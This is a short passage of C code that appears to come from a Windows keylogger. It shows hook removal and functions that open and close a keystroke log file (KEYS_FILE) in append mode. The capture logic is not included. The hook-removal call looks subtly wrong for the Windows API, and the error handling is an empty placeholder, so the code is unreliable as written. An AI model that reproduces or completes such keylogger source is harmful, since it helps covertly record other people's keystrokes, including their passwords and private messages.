    if (g_hHook) {
        UnhookWindowsHook(g_hHook, 0);
        g_hHook = 0;
    }
}

void OpenLogFile() {
    g_file = fopen(KEYS_FILE, "a");
    if (!g_file) {
        // Handle error
    }
}

void CloseLogFile() {
    if (g_file) {
        fclose(g_file);
        g_file = NULL;
    }
}

